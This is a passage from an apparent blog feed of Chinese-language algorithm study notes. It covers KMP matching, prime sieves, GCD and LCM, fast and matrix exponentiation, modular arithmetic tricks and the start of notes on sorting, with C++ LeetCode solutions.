<span class="keyword">if</span>(i==<span class="number">-1</span>||p[i]==p[j])&#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">                next[j]=i;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                i=next[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2-5-2-模式串在主串中有多少个完全匹配的主串？">2.5.2 模式串在主串中有多少个完全匹配的主串？</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Get_Next</span><span class="params">(string P, vector&lt;<span class="type">int</span>&gt; &amp;next)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> len = P.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || P[j - <span class="number">1</span>] == P[i - <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(string T, string P)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m = T.<span class="built_in">size</span>(), n = P.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="built_in">Get_Next</span>(P, next);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m - n + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || T[i - <span class="number">1</span>] == P[j - <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">            i = i - j + <span class="number">2</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string text = <span class="string">&quot;aaabcdaa&quot;</span>, pattern = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">KMP</span>(text, pattern) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>数学</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="0-1-质数">0.1 质数</h2>
<p><a href="https://leetcode.cn/problems/count-primes/solution/ji-shu-zhi-shu-by-leetcode-solution/">计数质数 - 计数质数 - 力扣（LeetCode）</a></p>
<blockquote>
<p>prime number：质数，素数。在大于 1 的自然数中，除了 1 和它本身以外不再有其他因数的自然数。否则称为合数。<br>
composite number：合数</p>
</blockquote>
<h3 id="0-1-1-暴力枚举">0.1.1 暴力枚举</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i * i &lt;= x; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPrimes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ans += <span class="built_in">isPrime</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="0-1-2-埃氏筛">0.1.2 埃氏筛</h3>
<blockquote>
<p>如果 <em>x</em> 是质数，那么大于 <em>x</em> 的倍数2<em>x</em>,3<em>x</em>,… 一定不是质数</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MX=<span class="number">1e5</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">isPrime</span><span class="params">(MX,<span class="literal">true</span>)</span></span>;</span><br><span class="line"><span class="keyword">auto</span> init=[]&#123;</span><br><span class="line">	isPrime[<span class="number">1</span>]=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=MX;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(isPrime[i])&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j=i*i;j&lt;=MX;j+=i)&#123;</span><br><span class="line">				isPrime[j]=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPrimes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">isPrime</span><span class="params">(n,<span class="number">1</span>)</span></span>;<span class="comment">//初始标记为质数</span></span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//对于质数才需要进行筛选</span></span><br><span class="line">            <span class="keyword">if</span>(isPrime[i])&#123;</span><br><span class="line">                ans++;</span><br><span class="line">                <span class="keyword">if</span>((<span class="type">long</span>)i*i&lt;n)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> j=i*i;j&lt;n;j+=i)</span><br><span class="line">                        isPrime[j]=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="0-1-3-线性筛">0.1.3 线性筛</h3>
<p>$$<br>
如果x可以被primes_i整除，对于合数y=x.primes_{i+1}={\frac{x}{primes_i}primes_{i+1}}primes_i<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPrimes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">isPrime</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isPrime[i]) &#123;</span><br><span class="line">                primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>() &amp;&amp; i * primes[j] &lt; n; ++j) &#123;</span><br><span class="line">                isPrime[i * primes[j]] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> primes.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>1 最大公约数(GCD)</h1>
<h2 id="1-1-欧几里得算法">1.1 欧几里得算法</h2>
<p><code>gcd(m,n)=gcd(n,m mod n)</code></p>
<blockquote>
<p>假设x是m，n的最大公约数，且m大于n（m小于n时，上式实现两个数的交换）</p>
<p>m=(m/n)*n+m%n（ <code>/</code> 表示整除）</p>
<p>n=(n/x)*x</p>
<p>则，则(m/n)*n有约数x，又m有约数x，则m%n也可以被x整除</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Euclid</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = m % n;</span><br><span class="line">        m = n;</span><br><span class="line">        n = t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">Euclid</span>(<span class="number">60</span>, <span class="number">24</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-连续整数检测算法">1.2 连续整数检测算法</h2>
<p>从m、n中较小的数开始查找，直到找到可以被m、n都整除的数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">min</span>(m, n);</span><br><span class="line">    <span class="keyword">while</span> (m % t != <span class="number">0</span> || n % t != <span class="number">0</span>)</span><br><span class="line">        --t;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">gcd</span>(<span class="number">60</span>, <span class="number">24</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-3-求m、n的质因数">1.3 求m、n的质因数</h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210328123217859.png" alt="abc"></p>
<center style="color:#C0C0C0;text-decoration:underline">算法设计与分析基础（ch1）</center> 
<blockquote>
<p>求不大于整数n的连续质数序列：</p>
<p><a href="https://baike.baidu.com/item/%E5%9F%83%E6%8B%89%E6%89%98%E8%89%B2%E5%B0%BC%E7%AD%9B%E9%80%89%E6%B3%95/4524938?fr=aladdin">埃拉托色尼筛选法（sieve of Eratosthenes）</a></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//埃拉托色尼筛选法，产生一个不大于给定整除n的连续质数序列</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sieve</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;isPrime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i * i &lt;= n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isPrime[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> t = i * i;</span><br><span class="line">            <span class="keyword">while</span> (t &lt;= n)</span><br><span class="line">            &#123;</span><br><span class="line">                isPrime[t] = <span class="number">0</span>;</span><br><span class="line">                t = t + i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;isPrime, <span class="type">int</span> m, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果i是质数</span></span><br><span class="line">        <span class="keyword">if</span> (isPrime[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (m % i == <span class="number">0</span> &amp;&amp; n % i == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                m = m / i;</span><br><span class="line">                n = n / i;</span><br><span class="line">                result *= i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">isPrime</span><span class="params">(min(m, n) + <span class="number">1</span>, <span class="number">1</span>)</span></span>; <span class="comment">//记录较小数的质数序列</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; isPrime.size() &lt;&lt; endl;</span></span><br><span class="line">    <span class="built_in">Sieve</span>(<span class="built_in">min</span>(m, n), isPrime);</span><br><span class="line">    cout &lt;&lt; <span class="built_in">gcd</span>(isPrime, <span class="built_in">max</span>(m, n), <span class="built_in">min</span>(m, n)) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 最小公倍数（LCM）</h1>
<p>$$<br>
LCM(m,n)=\frac{m*n}{GCD(m,n)}<br>
$$</p>
<h1>3 容斥原理</h1>
<h1>4 快速幂</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计算a^b%m</span></span><br><span class="line">   <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">       <span class="type">int</span> res=<span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> factor=a;</span><br><span class="line">       <span class="keyword">while</span>(b)&#123;</span><br><span class="line">           <span class="keyword">if</span>(b&amp;<span class="number">1</span>)&#123;</span><br><span class="line">               res=(res*factor)%m;</span><br><span class="line">           &#125;</span><br><span class="line">           factor=factor*factor%m;</span><br><span class="line">           b=(b&gt;&gt;<span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1>5 矩阵快速幂</h1>
<p><a href="https://leetcode.cn/problems/climbing-stairs/description/">70. 爬楼梯 - 力扣（LeetCode）</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; ret&#123;&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; ans=<span class="built_in">matrixPow</span>(ret,n);</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算矩阵a的n次方</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matrixPow</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp;a,<span class="type">int</span> n)&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; ret=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                ret=<span class="built_in">multiply</span>(ret,a);</span><br><span class="line">            &#125;</span><br><span class="line">            a=<span class="built_in">multiply</span>(a,a);</span><br><span class="line">            n=n/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算两个矩阵相乘</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">multiply</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; a,vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; b)&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">ans</span>(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">2</span>;k++)&#123;</span><br><span class="line">                    ans[i][j]+=a[i][k]*b[k][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>6 正整数技巧</h1>
<p>对于正整数，$xy&gt;=success$等价于$x\ge \left \lceil \frac{success}{y} \right \rceil$ 也等价于$x&gt; \left \lceil \frac{success-1}{y} \right \rceil$</p>
<p><a href="https://leetcode.cn/problems/successful-pairs-of-spells-and-potions/">2300. 咒语和药水的成功对数</a></p>
<h3 id="6-1-1-计算上界">6.1.1 计算上界</h3>
<p>$$<br>
\left \lceil \frac{pile}{speed} \right \rceil<br>
=\left \lfloor \frac{pile+speed-1}{speed} \right \rfloor<br>
=\left \lfloor \frac{pile-1}{speed} \right \rfloor+1\<br>
=\left \lfloor \frac{pile}{speed} \right \rfloor+(pile%speed !=0)<br>
$$</p>
<h3 id="6-1-2-同余定理">6.1.2 同余定理</h3>
<p>$$<br>
\begin{align}<br>
(s[R]-S[L])%m<mark>k\ s[R]%m-S[L]%m</mark>k \quad s[R]%m-S[L]%m+m<mark>k\ s[R]%m-k</mark>S[L]%m \quad s[R]%m+m-k<mark>S[L]%m\ \rightarrow (s[R]%m-k+m)%m</mark>s[L]%m<br>
\end{align}<br>
$$</p>
<p>$$<br>
s为负数情况取余数： x=(s%k+k)%k<br>
$$</p>
<h1>7 幂</h1>
<p>32 位有符号整数的范围内：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>最大的 3 的幂为 $2^{30}$</p>
</li>
<li class="lvl-2">
<p>最大的 3 的幂为 $3^{19}=1162261467$</p>
</li>
</ul>
<h4 id="231-2-的幂"><a href="https://leetcode.cn/problems/power-of-two/">231. 2 的幂</a></h4>
<blockquote>
<p>2的幂二进制表示中最高位为，其余位为0</p>
<p>只含因子2，</p>
</blockquote>
<p>$2^{30} mod: x==0$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(n%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">            n/=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> BIG=<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">return</span> n&gt;<span class="number">0</span>&amp;&amp;BIG%n==<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> cur=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur&lt;n)&#123;</span><br><span class="line">            cur*=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur==n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="342-4的幂"><a href="https://leetcode.cn/problems/power-of-four/">342. 4的幂</a></h4>
<blockquote>
<p>不能用2**30模4为0来判断，因为是2的幂也可以。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; (n &amp; (n - <span class="number">1</span>)) == <span class="number">0</span> &amp;&amp; (n &amp; <span class="number">0xaaaaaaaa</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//2的幂满足性质，4的幂满足性质 </span></span><br><span class="line">     <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; (n &amp; (n - <span class="number">1</span>)) == <span class="number">0</span>&amp;&amp; <span class="built_in">sqrt</span>(n)*<span class="built_in">sqrt</span>(n)==n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="7-2-函数">7.2 函数</h2>
<h3 id="7-2-1-对数">7.2.1 对数</h3>
<p>$$<br>
log_an=log_ab*log_bn=lob_ba/log_bn<br>
$$<br>
<mark>换底公式</mark>：<br>
$$<br>
log_bN=log_aN/log_ab\<br>
log_bN=X\<br>
b^X=N\<br>
log_ab^X=log_aN\<br>
Xlog_ab=log_aN<br>
$$</p>
<h3 id="7-2-2-幂函数">7.2.2 幂函数</h3>
<p>$x^a$</p>
<h3 id="7-2-3-指数函数">7.2.3 指数函数</h3>
<p>$a^x$</p>
<h1>8 离散数学</h1>
<h2 id="8-1-二元关系">8.1 二元关系</h2>
<h3 id="8-1-1-次序关系">8.1.1 次序关系</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>偏序</p>
<p>如果集合A上的二元关系R是自反的、反对称的和传递的，那么称R为A上的偏序，称序偶&lt;A,R&gt;为偏序集合。</p>
</li>
</ul>
<h1>9 单位</h1>
<p>皮秒：$1ps=10^{-12}s$</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2023/01/18/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1>1 排序算法</h1>
<p>$$<br>
时间复杂度O(nlogn)：归并排序、堆排序、快速排序<br>
$$</p>
<p><a href="https://mp.weixin.qq.com/s/vn3KiV-ez79FmbZ36SX9lg">十大经典排序算法动画与解析</a></p>
<p>稳定排序，是指在排序算法中，相同值的两个元素，在输入数组中先出现的数在输出数组中也先出现。像冒泡排序，插入排序，基数排序，归并排序等都是稳定排序。</p>
<p>原地(原址、就地)排序是指：基本上不需要额外辅助的的空间，允许少量额外的辅助变量进行的排序。就是在原来的排序数组中比较和交换的排序。像选择排序，插入排序，希尔排序，快速排序，堆排序等都会有一项比较且交换操作(swap(i,j))的逻辑在其中，因此他们都是属于原地(原址、就地)排序，而合并排序，计数排序，基数排序等不是原地排序。</p>
<p>根据一个数组对另一个数组排序</p>
<p><a href="https://leetcode.cn/problems/relative-ranks/">506. 相对名次 - 力扣（Leetcode）</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">findRelativeRanks</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; score)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=score.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rank</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            rank[i]=i;</span><br><span class="line">        <span class="built_in">sort</span>(rank.<span class="built_in">begin</span>(),rank.<span class="built_in">end</span>(),[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;</span><br><span class="line">            <span class="keyword">return</span> score[a]&gt;score[b];</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 排名为i+1的运动员下标位置</span></span><br><span class="line">            <span class="type">int</span> pos=rank[i];</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                ans[pos]=<span 